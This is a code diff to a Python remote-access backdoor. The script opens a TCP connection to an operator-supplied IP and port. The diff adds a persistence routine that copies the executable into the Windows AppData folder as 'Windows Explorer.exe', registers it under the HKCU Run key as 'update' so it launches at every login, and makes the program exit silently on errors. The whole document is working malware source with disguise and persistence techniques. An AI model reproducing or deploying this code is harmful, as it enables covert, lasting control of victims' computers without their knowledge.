@@ -4,6 +4,7 @@
 
 import subprocess
 import optparse
+import shutil
 import base64
 import socket
 import json
@@ -25,8 +26,20 @@ def get_arguments():
 
 class Backdoor:
     def __init__(self, ip, port):
-        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # IPv4 and TCP
-        self.connection.connect((ip, port))                                 # establishes connection
+        self.become_persistent()
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     # IPv4 and TCP
+        self.connection.connect((ip, port))                                     # establishes connection
+
+
+    def become_persistent(self):
+        if 'win' in sys.platform:
+            """Sets file location for Windows systems."""
+            evil_file_location = os.environ['appdata'] + '\\Windows Explorer.exe'
+            if not os.path.exists(evil_file_location):
+                # copies file to location
+                shutil.copyfile(sys.executable, evil_file_location)
+                # add executable to Windows registry
+                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
 
     def reliable_send(self, data):
@@ -88,7 +101,10 @@ class Backdoor:
 
 options = get_arguments()
 
-my_backdoor = Backdoor(options.ip, options.port)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor(options.ip, options.port)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
 
 print('Got a connection from: ' + options.ip + ':' + options.port)
